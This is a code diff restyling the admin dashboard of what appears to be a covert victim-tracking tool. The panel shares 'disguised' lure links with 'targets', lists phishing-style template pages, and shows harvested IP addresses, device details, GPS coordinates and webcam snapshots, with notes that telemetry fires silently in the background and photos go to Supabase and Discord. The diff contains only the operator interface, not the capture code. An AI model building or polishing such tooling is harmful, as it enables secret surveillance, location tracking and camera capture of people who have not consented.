@@ -1,73 +1,90 @@
 @extends('layouts.admin')
 
-@section('title', 'Overview')
+@section('title', 'Mission Control')
 
 @section('content')
 <div class="space-y-6 max-w-7xl mx-auto">
 
     <!-- Top Header & Quick Status -->
-    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
+    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 p-4 sm:p-5 rounded-2xl bg-[#FFFDF9] border-[2.5px] border-black shadow-neo">
         <div>
-            <h1 class="text-xl sm:text-2xl font-bold text-white tracking-tight">Mission Control</h1>
-            <p class="text-zinc-400 text-xs sm:text-sm mt-0.5">Real-time target telemetry, campaign manager, and captures.</p>
+            <div class="flex items-center gap-2">
+                <span class="px-2 py-0.5 rounded-md bg-pastel-lime border border-black text-[10px] font-mono font-bold uppercase shadow-neo-sm">
+                    LIVE SYSTEM
+                </span>
+                <h1 class="text-xl sm:text-2xl font-black text-black tracking-tight">Mission Control</h1>
+            </div>
+            <p class="text-zinc-600 text-xs sm:text-sm mt-1 font-medium">Real-time target telemetry, campaign manager, and captures.</p>
         </div>
 
         <div class="flex items-center gap-2.5 flex-wrap">
-            <div class="flex items-center px-3 py-1.5 rounded-full border text-[11px] font-mono {{ $discordConfigured ? 'bg-emerald-950/40 border-emerald-800/80 text-emerald-400' : 'bg-amber-950/40 border-amber-800/80 text-amber-400' }}">
-                <span class="w-2 h-2 rounded-full mr-2 shrink-0 {{ $discordConfigured ? 'bg-emerald-500 animate-pulse' : 'bg-amber-500' }}"></span>
+            <div class="flex items-center px-3.5 py-1.5 rounded-xl border-2 border-black text-xs font-bold font-mono shadow-neo-sm {{ $discordConfigured ? 'bg-pastel-green text-black' : 'bg-pastel-orange text-black' }}">
+                <span class="w-2.5 h-2.5 rounded-full mr-2 shrink-0 {{ $discordConfigured ? 'bg-black animate-pulse' : 'bg-black' }}"></span>
                 Discord: {{ $discordConfigured ? 'CONNECTED' : 'NOT SET' }}
             </div>
-            <a href="{{ route('admin.settings') }}" class="px-3.5 py-1.5 text-xs font-medium bg-zinc-800 hover:bg-zinc-700 text-white rounded-lg transition flex items-center gap-1.5 shadow-sm">
-                <i class="fa-solid fa-sliders text-pink-400"></i>
+            <a href="{{ route('admin.settings') }}" class="px-4 py-2 text-xs font-black bg-pastel-yellow hover:bg-yellow-300 text-black border-2 border-black rounded-xl shadow-neo-sm hover:shadow-neo active:translate-x-0.5 active:translate-y-0.5 active:shadow-none transition flex items-center gap-1.5">
+                <i class="fa-solid fa-sliders"></i>
                 <span>Config</span>
             </a>
         </div>
     </div>
 
     <!-- Active Target Link Card & Campaign Selector -->
-    <div class="p-4 sm:p-6 rounded-2xl bg-gradient-to-r from-zinc-900 via-zinc-900 to-pink-950/30 border border-zinc-800 shadow-xl space-y-4">
-        <div class="flex flex-col lg:flex-row lg:items-center justify-between gap-3">
-            <div class="space-y-1">
+    <div class="p-5 sm:p-6 rounded-2xl bg-[#FFFDF9] border-[2.5px] border-black shadow-neo-lg space-y-5">
+        <div class="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
+            <div class="space-y-1.5">
                 <div class="flex items-center gap-2 flex-wrap">
-                    <span class="text-xs uppercase font-mono tracking-wider text-pink-400 font-semibold">Active Disguised URL</span>
-                    <span class="px-2 py-0.5 rounded-full bg-pink-950/60 border border-pink-800/60 text-pink-300 text-[10px] font-mono">
+                    <span class="text-xs uppercase font-mono tracking-wider text-black font-black bg-pastel-orange border border-black px-2 py-0.5 rounded-md shadow-neo-sm">
+                        ACTIVE DISGUISED URL
+                    </span>
+                    <span class="px-2 py-0.5 rounded-md bg-pastel-purple border border-black text-black text-xs font-mono font-bold">
                         Template: {{ $templates[$activeTemplate]['name'] ?? $activeTemplate }}
                     </span>
                 </div>
-                <div class="text-[11px] sm:text-xs text-zinc-400">Share this link with target. Backend telemetry triggers will fire silently.</div>
+                <p class="text-xs sm:text-sm text-zinc-600 font-medium">Bagikan link utama ini ke target. Sistem telemetri akan berjalan di latar belakang.</p>
             </div>
-            <div class="flex flex-col sm:flex-row items-stretch sm:items-center gap-2 max-w-xl w-full">
+            <div class="flex flex-col sm:flex-row items-stretch sm:items-center gap-2.5 max-w-xl w-full">
                 <input type="text" id="targetLink" readonly value="{{ route('landing') }}" 
-                       class="w-full bg-zinc-950 border border-zinc-700/80 rounded-xl px-3.5 py-2.5 text-xs text-pink-300 font-mono focus:outline-none select-all truncate">
-                <button onclick="copyTargetLink('targetLink', 'copyBtnText')" class="px-4 py-2.5 bg-pink-600 hover:bg-pink-500 text-white text-xs font-medium rounded-xl transition shrink-0 flex items-center justify-center gap-1.5 shadow-lg shadow-pink-600/20 active:scale-95">
-                    <i class="fa-solid fa-copy"></i>
+                       class="w-full bg-white border-2 border-black rounded-xl px-4 py-2.5 text-xs sm:text-sm text-black font-mono font-bold shadow-neo-sm focus:outline-none select-all truncate">
+                <button onclick="copyTargetLink('targetLink', 'copyBtnText')" class="px-5 py-2.5 bg-pastel-lime hover:bg-pastel-limeDark text-black text-xs font-black uppercase tracking-wider rounded-xl border-2 border-black shadow-neo hover:shadow-neo-lg active:translate-x-0.5 active:translate-y-0.5 active:shadow-none transition shrink-0 flex items-center justify-center gap-2">
+                    <i class="fa-solid fa-copy text-sm"></i>
                     <span id="copyBtnText">Copy Link</span>
                 </button>
             </div>
         </div>
 
         <!-- Template Campaign Links Quick Row -->
-        <div class="pt-4 border-t border-zinc-800/80">
-            <span class="text-[10px] sm:text-[11px] uppercase font-mono tracking-wider text-zinc-500 font-semibold block mb-2.5">
-                <i class="fa-solid fa-layer-group text-pink-400 mr-1"></i> Quick Campaign Template Links:
+        <div class="pt-4 border-t-2 border-dashed border-black/20">
+            <span class="text-xs uppercase font-mono tracking-wider text-black font-extrabold block mb-3">
+                <i class="fa-solid fa-layer-group text-purple-600 mr-1.5"></i> Quick Template Direct Links:
             </span>
-            <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2">
+            <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2.5">
+                @php
+                    $pastelBgs = [
+                        'kapan-pulang' => 'bg-pastel-yellow',
+                        'chat' => 'bg-pastel-purple',
+                        'chatme' => 'bg-pastel-pink',
+                        'diamond' => 'bg-pastel-lime',
+                        'penarikandana' => 'bg-pastel-green',
+                        'template' => 'bg-pastel-orange',
+                    ];
+                @endphp
                 @foreach($templates as $id => $tpl)
-                    <div class="p-2.5 rounded-xl bg-zinc-950 border border-zinc-800 flex flex-col justify-between hover:border-pink-500/40 transition">
-                        <div class="flex items-center justify-between mb-1.5">
-                            <span class="w-6 h-6 rounded-md bg-gradient-to-tr {{ $tpl['color'] }} flex items-center justify-center text-[10px] text-white shrink-0">
+                    <div class="p-3 rounded-xl border-2 border-black {{ $pastelBgs[$id] ?? 'bg-white' }} shadow-neo-sm hover:shadow-neo transition flex flex-col justify-between">
+                        <div class="flex items-center justify-between mb-2">
+                            <span class="w-7 h-7 rounded-lg bg-black text-white flex items-center justify-center text-xs shadow-neo-sm">
                                 <i class="fa-solid {{ $tpl['icon'] }}"></i>
                             </span>
-                            <span class="text-[9px] font-mono {{ $activeTemplate === $id ? 'text-pink-400 font-bold' : 'text-zinc-500' }}">
+                            <span class="text-[9px] font-mono font-bold bg-white border border-black px-1.5 py-0.5 rounded">
                                 {{ $activeTemplate === $id ? 'DEFAULT' : '/p/' . $id }}
                             </span>
                         </div>
-                        <div class="text-[11px] font-semibold text-zinc-200 truncate mb-2" title="{{ $tpl['name'] }}">{{ $tpl['name'] }}</div>
-                        <div class="flex items-center justify-between gap-1 pt-1.5 border-t border-zinc-900 text-[10px]">
-                            <a href="{{ route('landing.custom', $id) }}" target="_blank" class="text-zinc-400 hover:text-white p-1">
+                        <div class="text-xs font-extrabold text-black truncate mb-2.5" title="{{ $tpl['name'] }}">{{ $tpl['name'] }}</div>
+                        <div class="flex items-center justify-between gap-1 pt-2 border-t border-black/20 text-[10px]">
+                            <a href="{{ route('landing.custom', $id) }}" target="_blank" class="p-1 rounded bg-white border border-black text-black hover:bg-black hover:text-white transition">
                                 <i class="fa-solid fa-eye"></i>
                             </a>
-                            <button onclick="copyDirectUrl('{{ route('landing.custom', $id) }}', this)" class="text-pink-400 hover:text-pink-300 font-mono py-0.5 px-1.5 rounded hover:bg-pink-950/40">
+                            <button onclick="copyDirectUrl('{{ route('landing.custom', $id) }}', this)" class="text-black font-mono font-bold py-1 px-2 rounded bg-white border border-black hover:bg-black hover:text-white transition shadow-neo-sm active:shadow-none">
                                 Copy URL
                             </button>
                         </div>
@@ -77,70 +94,91 @@
         </div>
     </div>
 
-    <!-- Stats Grid -->
-    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3.5 sm:gap-5">
-        <div class="p-4 sm:p-6 rounded-2xl bg-zinc-900/90 border border-zinc-800 relative overflow-hidden">
+    <!-- Stats Grid (Neo-Brutalist Big Cards) -->
+    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-5">
+        <!-- Stat 1: Total Visits (Pastel Purple) -->
+        <div class="p-5 sm:p-6 rounded-2xl bg-pastel-purple border-[2.5px] border-black shadow-neo-lg relative overflow-hidden flex flex-col justify-between">
             <div class="flex items-center justify-between">
                 <div>
-                    <p class="text-[10px] sm:text-xs font-medium uppercase tracking-wider text-zinc-400">Total Visits Logged</p>
-                    <h3 class="text-2xl sm:text-3xl font-black text-white mt-1.5">{{ number_format($totalLogs) }}</h3>
+                    <span class="px-2 py-0.5 rounded-md bg-white border border-black text-[10px] font-mono font-bold uppercase shadow-neo-sm">
+                        RECONNAISSANCE
+                    </span>
+                    <p class="text-xs font-extrabold text-black uppercase tracking-wider mt-2">Total Visits Logged</p>
+                    <h3 class="text-3xl sm:text-4xl font-black text-black mt-1">{{ number_format($totalLogs) }}</h3>
                 </div>
-                <div class="w-10 h-10 sm:w-12 sm:h-12 rounded-xl bg-blue-500/10 border border-blue-500/20 flex items-center justify-center text-blue-400 text-lg sm:text-xl">
+                <div class="w-12 h-12 rounded-2xl bg-white border-2 border-black shadow-neo flex items-center justify-center text-black text-2xl">
                     <i class="fa-solid fa-users"></i>
                 </div>
             </div>
-            <p class="text-[10px] sm:text-[11px] text-zinc-500 mt-3">Browser, OS, IP reconnaissance</p>
+            <div class="mt-4 pt-3 border-t border-black/20 text-xs font-bold text-zinc-700 font-mono">
+                Browser, OS, IP Data
+            </div>
         </div>
 
-        <div class="p-4 sm:p-6 rounded-2xl bg-zinc-900/90 border border-zinc-800 relative overflow-hidden">
+        <!-- Stat 2: GPS Coordinates (Pastel Orange) -->
+        <div class="p-5 sm:p-6 rounded-2xl bg-pastel-orange border-[2.5px] border-black shadow-neo-lg relative overflow-hidden flex flex-col justify-between">
             <div class="flex items-center justify-between">
                 <div>
-                    <p class="text-[10px] sm:text-xs font-medium uppercase tracking-wider text-zinc-400">GPS Coordinates</p>
-                    <h3 class="text-2xl sm:text-3xl font-black text-amber-400 mt-1.5">{{ number_format($totalGps) }}</h3>
+                    <span class="px-2 py-0.5 rounded-md bg-white border border-black text-[10px] font-mono font-bold uppercase shadow-neo-sm">
+                        GEOLOCATION
+                    </span>
+                    <p class="text-xs font-extrabold text-black uppercase tracking-wider mt-2">GPS Coordinates</p>
+                    <h3 class="text-3xl sm:text-4xl font-black text-black mt-1">{{ number_format($totalGps) }}</h3>
                 </div>
-                <div class="w-10 h-10 sm:w-12 sm:h-12 rounded-xl bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-amber-400 text-lg sm:text-xl">
-                    <i class="fa-solid fa-location-dot"></i>
+                <div class="w-12 h-12 rounded-2xl bg-white border-2 border-black shadow-neo flex items-center justify-center text-black text-2xl">
+                    <i class="fa-solid fa-location-dot text-red-600"></i>
                 </div>
             </div>
-            <p class="text-[10px] sm:text-[11px] text-zinc-500 mt-3">High precision coordinates logged</p>
+            <div class="mt-4 pt-3 border-t border-black/20 text-xs font-bold text-zinc-700 font-mono">
+                High precision coordinates
+            </div>
         </div>
 
-        <div class="p-4 sm:p-6 rounded-2xl bg-zinc-900/90 border border-zinc-800 relative overflow-hidden sm:col-span-2 lg:col-span-1">
+        <!-- Stat 3: Webcam Snapshots (Neon Lime) -->
+        <div class="p-5 sm:p-6 rounded-2xl bg-pastel-lime border-[2.5px] border-black shadow-neo-lg relative overflow-hidden sm:col-span-2 lg:col-span-1 flex flex-col justify-between">
             <div class="flex items-center justify-between">
                 <div>
-                    <p class="text-[10px] sm:text-xs font-medium uppercase tracking-wider text-zinc-400">Webcam Snapshots</p>
-                    <h3 class="text-2xl sm:text-3xl font-black text-pink-400 mt-1.5">{{ number_format($totalSnapshots) }}</h3>
+                    <span class="px-2 py-0.5 rounded-md bg-white border border-black text-[10px] font-mono font-bold uppercase shadow-neo-sm">
+                        CAMERA TELEMETRY
+                    </span>
+                    <p class="text-xs font-extrabold text-black uppercase tracking-wider mt-2">Webcam Snapshots</p>
+                    <h3 class="text-3xl sm:text-4xl font-black text-black mt-1">{{ number_format($totalSnapshots) }}</h3>
                 </div>
-                <div class="w-10 h-10 sm:w-12 sm:h-12 rounded-xl bg-pink-500/10 border border-pink-500/20 flex items-center justify-center text-pink-400 text-lg sm:text-xl">
-                    <i class="fa-solid fa-camera"></i>
+                <div class="w-12 h-12 rounded-2xl bg-white border-2 border-black shadow-neo flex items-center justify-center text-black text-2xl">
+                    <i class="fa-solid fa-camera text-purple-600"></i>
                 </div>
             </div>
-            <p class="text-[10px] sm:text-[11px] text-zinc-500 mt-3">Photos in Supabase & Discord</p>
+            <div class="mt-4 pt-3 border-t border-black/20 text-xs font-bold text-zinc-700 font-mono">
+                Stored in Supabase & Discord
+            </div>
         </div>
     </div>
 
-    <!-- Recent Logs (Responsive Card List on Mobile, Table on Desktop) -->
-    <div class="rounded-2xl bg-zinc-900 border border-zinc-800 overflow-hidden shadow-xl">
-        <div class="p-4 sm:p-5 border-b border-zinc-800 flex items-center justify-between">
-            <div class="flex items-center space-x-2">
-                <i class="fa-solid fa-satellite-dish text-pink-400 text-sm"></i>
-                <h3 class="font-semibold text-white text-sm sm:text-base">Recent Target Activity</h3>
+    <!-- Recent Logs (Neo-Brutalist Table & Mobile Card List) -->
+    <div class="rounded-2xl bg-[#FFFDF9] border-[2.5px] border-black shadow-neo-lg overflow-hidden">
+        <div class="p-4 sm:p-5 border-b-[2.5px] border-black bg-cream-100 flex items-center justify-between">
+            <div class="flex items-center space-x-2.5">
+                <span class="w-8 h-8 rounded-xl bg-pastel-lime border-2 border-black shadow-neo-sm flex items-center justify-center text-black text-sm">
+                    <i class="fa-solid fa-satellite-dish"></i>
+                </span>
+                <h3 class="font-black text-black text-sm sm:text-base">Recent Target Activity</h3>
             </div>
-            <a href="{{ route('admin.logs') }}" class="text-xs text-pink-400 hover:text-pink-300 font-medium">
-                View All &rarr;
+            <a href="{{ route('admin.logs') }}" class="px-3 py-1.5 bg-white hover:bg-pastel-purple text-black font-extrabold text-xs rounded-xl border-2 border-black shadow-neo-sm hover:shadow-neo active:translate-x-0.5 active:translate-y-0.5 active:shadow-none transition flex items-center gap-1">
+                <span>View All Logs</span> &rarr;
             </a>
         </div>
 
         @if($recentLogs->isEmpty())
             <div class="p-10 sm:p-12 text-center text-zinc-500">
-                <i class="fa-solid fa-radar text-4xl mb-3 opacity-40"></i>
-                <p class="text-xs sm:text-sm">No target activity recorded yet. Share the landing link to start capturing telemetry.</p>
+                <i class="fa-solid fa-radar text-4xl mb-3 text-black"></i>
+                <h4 class="font-bold text-black text-base">Belum Ada Aktivitas Terdeteksi</h4>
+                <p class="text-xs text-zinc-600 mt-1 max-w-sm mx-auto font-medium">Bagikan link landing page ke target untuk mulai mengumpulkan data telemetri.</p>
             </div>
         @else
             <!-- Desktop Table View (Hidden on mobile) -->
             <div class="hidden md:block overflow-x-auto scrollbar-slim touch-scroll">
                 <table class="w-full text-left text-xs">
-                    <thead class="bg-zinc-950/60 text-zinc-400 uppercase font-mono text-[10px] tracking-wider border-b border-zinc-800">
+                    <thead class="bg-cream-300 text-black uppercase font-mono text-[11px] font-bold tracking-wider border-b-2 border-black">
                         <tr>
                             <th class="p-4">Target IP / Location</th>
                             <th class="p-4">Device / OS</th>
@@ -150,49 +188,49 @@
                             <th class="p-4 text-right">Action</th>
                         </tr>
                     </thead>
-                    <tbody class="divide-y divide-zinc-800/60 text-zinc-300">
+                    <tbody class="divide-y-2 divide-black/10 text-zinc-800 font-medium">
                         @foreach($recentLogs as $log)
-                            <tr class="hover:bg-zinc-850/60 transition">
+                            <tr class="hover:bg-pastel-yellow/30 transition">
                                 <td class="p-4 font-mono">
-                                    <div class="font-bold text-white">{{ $log->ip }}</div>
-                                    <div class="text-[11px] text-zinc-400">{{ $log->city ?? 'Unknown' }}, {{ $log->country ?? 'Unknown' }}</div>
+                                    <div class="font-bold text-black text-sm">{{ $log->ip }}</div>
+                                    <div class="text-xs text-zinc-600 font-bold">{{ $log->city ?? 'Unknown' }}, {{ $log->country ?? 'Unknown' }}</div>
                                     @if($log->isp)
-                                        <div class="text-[10px] text-zinc-500 truncate max-w-xs">{{ $log->isp }}</div>
+                                        <div class="text-[10px] text-zinc-500 truncate max-w-xs font-normal">{{ $log->isp }}</div>
                                     @endif
                                 </td>
                                 <td class="p-4">
-                                    <div class="text-zinc-200">{{ $log->platform ?? 'Unknown' }}</div>
-                                    <div class="text-[11px] text-zinc-400 truncate max-w-xs">{{ $log->screen_resolution ?? 'Screen: N/A' }} | RAM: {{ $log->ram ? $log->ram . 'GB' : 'N/A' }}</div>
+                                    <div class="font-bold text-black">{{ $log->platform ?? 'Unknown' }}</div>
+                                    <div class="text-[11px] text-zinc-600 truncate max-w-xs font-mono">{{ $log->screen_resolution ?? 'Screen: N/A' }} • RAM: {{ $log->ram ? $log->ram . 'GB' : 'N/A' }}</div>
                                 </td>
                                 <td class="p-4">
                                     @if($log->gps_lat && $log->gps_lon)
                                         <a href="https://www.google.com/maps/place/{{ $log->gps_lat }},{{ $log->gps_lon }}" target="_blank" 
-                                           class="inline-flex items-center px-2.5 py-1 rounded-md bg-amber-950/50 border border-amber-800/60 text-amber-300 text-[11px] hover:bg-amber-900/60 transition">
-                                            <i class="fa-solid fa-map-location-dot mr-1"></i> Maps
+                                           class="inline-flex items-center px-3 py-1 rounded-lg bg-pastel-orange border border-black text-black font-bold text-xs shadow-neo-sm hover:shadow-none active:translate-x-0.5 active:translate-y-0.5 transition">
+                                            <i class="fa-solid fa-map-location-dot mr-1.5 text-red-600"></i> Maps
                                         </a>
                                     @elseif($log->gps_error)
-                                        <span class="inline-flex items-center px-2 py-0.5 rounded text-[10px] bg-red-950/40 text-red-400 border border-red-800/40">
+                                        <span class="inline-flex items-center px-2.5 py-0.5 rounded-md text-[10px] font-bold font-mono bg-pastel-pink text-black border border-black shadow-neo-sm">
                                             Denied
                                         </span>
                                     @else
-                                        <span class="text-zinc-500 font-mono">Pending</span>
+                                        <span class="text-zinc-500 font-mono text-[11px]">Pending</span>
                                     @endif
                                 </td>
                                 <td class="p-4">
                                     @if($log->snapshots->isNotEmpty())
-                                        <span class="inline-flex items-center px-2 py-1 rounded-md bg-pink-950/50 border border-pink-800/60 text-pink-300 text-[11px] font-mono">
+                                        <span class="inline-flex items-center px-2.5 py-1 rounded-lg bg-pastel-lime border border-black text-black font-bold text-xs font-mono shadow-neo-sm">
                                             <i class="fa-solid fa-camera mr-1"></i> {{ $log->snapshots->count() }} snaps
                                         </span>
                                     @else
-                                        <span class="text-zinc-500 font-mono">-</span>
+                                        <span class="text-zinc-400 font-mono">-</span>
                                     @endif
                                 </td>
-                                <td class="p-4 font-mono text-zinc-400 text-[11px]">
+                                <td class="p-4 font-mono text-zinc-600 text-xs">
                                     {{ $log->created_at->diffForHumans() }}
                                 </td>
                                 <td class="p-4 text-right">
-                                    <a href="{{ route('admin.logs', ['search' => $log->ip]) }}" class="px-2.5 py-1 text-xs bg-zinc-800 hover:bg-zinc-700 text-zinc-200 rounded-lg transition">
-                                        Details
+                                    <a href="{{ route('admin.logs', ['search' => $log->ip]) }}" class="px-3.5 py-1.5 text-xs font-black bg-white hover:bg-pastel-purple text-black rounded-lg border-2 border-black shadow-neo-sm hover:shadow-neo active:translate-x-0.5 active:translate-y-0.5 active:shadow-none transition">
+                                        Details &rarr;
                                     </a>
                                 </td>
                             </tr>
@@ -201,36 +239,36 @@
                 </table>
             </div>
 
-            <!-- Mobile Card View (Optimized for Small Screens) -->
-            <div class="md:hidden divide-y divide-zinc-800/60">
+            <!-- Mobile Card View (Neo-Brutalism for Mobile) -->
+            <div class="md:hidden divide-y-2 divide-black/10 p-3 space-y-3">
                 @foreach($recentLogs as $log)
-                    <div class="p-4 space-y-2.5 hover:bg-zinc-850/40 transition">
+                    <div class="p-4 rounded-xl bg-white border-2 border-black shadow-neo-sm space-y-3">
                         <div class="flex items-start justify-between gap-2">
                             <div>
-                                <span class="font-bold text-white font-mono text-sm">{{ $log->ip }}</span>
-                                <div class="text-xs text-zinc-400">{{ $log->city ?? 'Unknown' }}, {{ $log->country ?? 'Unknown' }}</div>
+                                <span class="font-black text-black font-mono text-sm block">{{ $log->ip }}</span>
+                                <div class="text-xs font-bold text-zinc-600">{{ $log->city ?? 'Unknown' }}, {{ $log->country ?? 'Unknown' }}</div>
                             </div>
-                            <span class="text-[10px] text-zinc-500 font-mono">{{ $log->created_at->diffForHumans() }}</span>
+                            <span class="text-[10px] text-zinc-600 font-mono font-bold bg-cream-300 px-2 py-0.5 rounded border border-black">{{ $log->created_at->diffForHumans() }}</span>
                         </div>
 
-                        <div class="text-[11px] text-zinc-400 flex items-center justify-between pt-1">
-                            <span><i class="fa-solid fa-laptop text-zinc-500 mr-1"></i> {{ $log->platform ?? 'Unknown OS' }}</span>
+                        <div class="text-xs text-zinc-700 flex items-center justify-between pt-1">
+                            <span class="font-bold"><i class="fa-solid fa-laptop text-black mr-1"></i> {{ $log->platform ?? 'Unknown OS' }}</span>
                             @if($log->snapshots->isNotEmpty())
-                                <span class="text-pink-400 font-mono text-[10px]"><i class="fa-solid fa-camera mr-1"></i> {{ $log->snapshots->count() }} snaps</span>
+                                <span class="bg-pastel-lime border border-black px-2 py-0.5 rounded font-mono font-bold text-[10px] shadow-neo-sm"><i class="fa-solid fa-camera mr-1"></i> {{ $log->snapshots->count() }} snaps</span>
                             @endif
                         </div>
 
-                        <div class="flex items-center justify-between pt-1.5 border-t border-zinc-800/60 text-xs">
+                        <div class="flex items-center justify-between pt-2 border-t border-black/10 text-xs">
                             @if($log->gps_lat && $log->gps_lon)
                                 <a href="https://www.google.com/maps/place/{{ $log->gps_lat }},{{ $log->gps_lon }}" target="_blank" 
-                                   class="text-amber-400 hover:text-amber-300 font-medium flex items-center gap-1">
-                                    <i class="fa-solid fa-map-location-dot"></i> Google Maps
+                                   class="px-2.5 py-1 bg-pastel-orange border border-black rounded-lg text-black font-bold flex items-center gap-1 shadow-neo-sm">
+                                    <i class="fa-solid fa-map-location-dot text-red-600"></i> Maps
                                 </a>
                             @else
-                                <span class="text-zinc-500 text-[11px]">GPS: {{ $log->gps_error ? 'Denied' : 'None' }}</span>
+                                <span class="text-zinc-500 font-mono text-[11px]">GPS: {{ $log->gps_error ? 'Denied' : 'None' }}</span>
                             @endif
 
-                            <a href="{{ route('admin.logs', ['search' => $log->ip]) }}" class="px-3 py-1 bg-zinc-800 hover:bg-zinc-700 text-zinc-200 rounded-lg text-xs font-medium">
+                            <a href="{{ route('admin.logs', ['search' => $log->ip]) }}" class="px-3.5 py-1 bg-pastel-purple hover:bg-purple-300 text-black border border-black rounded-lg text-xs font-bold shadow-neo-sm">
                                 Details &rarr;
                             </a>
                         </div>
